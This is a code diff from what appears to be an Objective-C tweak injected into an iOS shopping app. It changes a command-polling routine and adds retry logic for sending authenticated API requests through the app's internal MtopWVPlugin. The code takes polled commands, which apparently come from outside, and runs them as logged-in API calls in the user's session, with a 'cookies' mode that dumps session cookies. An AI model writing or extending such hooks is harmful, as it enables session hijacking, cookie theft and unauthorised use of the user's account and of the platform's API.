@@ -135,27 +135,57 @@ static void doSwizzle(void) {
 }
 
 // ---------- 指令执行 ----------
-static void execCall(NSDictionary *cmd) {
-    NSString *api = cmd[@"api"];
-    if (!api.length) return;
-    NSString *v = cmd[@"v"] ?: @"1.0";
-    id data = cmd[@"data"] ?: @{};
-    NSString *tag = cmd[@"tag"] ?: @"";
-    NSDictionary *req = @{@"api": api, @"v": v, @"data": data,
-                          @"type": @"originaljson", @"dataType": @"json",
-                          @"needLogin": @YES, @"ecode": @1, @"timeout": @20000};
-    NSString *cbId = [NSString stringWithFormat:@"$xy%ld", ++gCmdSeq];
-    if (tag.length) gPending[cbId] = tag;
+static void sendViaPlugin(NSDictionary *req, NSString *cbId) {
     Class plugin = NSClassFromString(@"MtopWVPlugin");
     id inst = [plugin performSelector:@selector(instance)];
     WKWebView *wv = gWebView;
     if (!inst) { W(@"no plugin instance"); return; }
     SEL sel = @selector(send:withCallback:withWebView:withViewController:);
     if (![inst respondsToSelector:sel]) { W(@"plugin no send sel"); return; }
-    W(@"EXEC %@ v=%@ tag=%@ cb=%@ webview=%@", api, v, tag, cbId, wv ? @"yes" : @"nil");
+    @try {
+        W(@"SEND-START api=%@ dataClass=%@", req[@"api"], NSStringFromClass([req[@"data"] class]));
+        flushLogs();
+        ((void (*)(id, SEL, id, id, id, id))objc_msgSend)(inst, sel, req, cbId, wv, nil);
+        W(@"SEND-OK");
+    } @catch (NSException *e) {
+        W(@"SEND-EXCEPTION %@: %@", e.name, e.reason);
+    }
     flushLogs();
-    ((void (*)(id, SEL, id, id, id, id))objc_msgSend)(inst, sel, req, cbId, wv, nil);
-    // 30s 后若仍 pending，清理
+}
+
+static void execCall(NSDictionary *cmd) {
+    NSString *api = cmd[@"api"];
+    if (!api.length) return;
+    NSString *v = cmd[@"v"] ?: @"1.0";
+    NSString *tag = cmd[@"tag"] ?: @"";
+    id rawData = cmd[@"data"] ?: @{};
+    NSString *dataStr = nil;
+    if ([rawData isKindOfClass:[NSString class]]) dataStr = rawData;
+    else { NSData *jd = [NSJSONSerialization dataWithJSONObject:rawData options:0 error:nil]; dataStr = jd ? [[NSString alloc] initWithData:jd encoding:NSUTF8StringEncoding] : @"{}"; }
+
+    NSString *cbId = [NSString stringWithFormat:@"$xy%ld", ++gCmdSeq];
+    if (tag.length) gPending[cbId] = tag;
+
+    // 尝试 1：data 为字典
+    NSDictionary *req1 = @{@"api": api, @"v": v, @"data": rawData,
+                           @"type": @"originaljson", @"dataType": @"json",
+                           @"needLogin": @YES, @"ecode": @1, @"timeout": @20000};
+    sendViaPlugin(req1, cbId);
+    if (!gPending[cbId]) { W(@"call done (dict) tag=%@", tag); flushLogs(); return; }
+
+    // 尝试 2：data 为 JSON 字符串
+    NSDictionary *req2 = @{@"api": api, @"v": v, @"data": dataStr,
+                           @"type": @"originaljson", @"dataType": @"json",
+                           @"needLogin": @YES, @"ecode": @1, @"timeout": @20000};
+    W(@"retry with data-as-string");
+    sendViaPlugin(req2, cbId);
+    if (!gPending[cbId]) { W(@"call done (string) tag=%@", tag); flushLogs(); return; }
+
+    // 尝试 3：极简字段
+    NSDictionary *req3 = @{@"api": api, @"v": v, @"data": dataStr};
+    W(@"retry minimal");
+    sendViaPlugin(req3, cbId);
+
     dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(30 * NSEC_PER_SEC)),
                    dispatch_get_main_queue(), ^{
         if (gPending[cbId]) { [gPending removeObjectForKey:cbId]; W(@"cmd timeout %@", tag); flushLogs(); }
@@ -170,11 +200,14 @@ static void pollCmd(void) {
         id obj = [NSJSONSerialization JSONObjectWithData:d options:0 error:nil];
         if (![obj isKindOfClass:[NSDictionary class]]) return;
         long long at = [obj[@"at"] longLongValue];
+        long long nowms = (long long)([[NSDate date] timeIntervalSince1970] * 1000);
         if (at <= gLastCmdAt) return;
+        if (at > nowms + 60000) return; // 未来时间戳：忽略，不消费
         gLastCmdAt = at;
         NSString *mode = obj[@"mode"] ?: @"";
         W(@"CMD mode=%@ at=%lld", mode, at);
         if ([mode isEqualToString:@"call"]) {
+            if (![obj[@"arm"] boolValue]) { W(@"call not armed, skip"); return; }
             execCall(obj);
         } else if ([mode isEqualToString:@"cookies"]) {
             dumpCookiesTo(@"cmd");
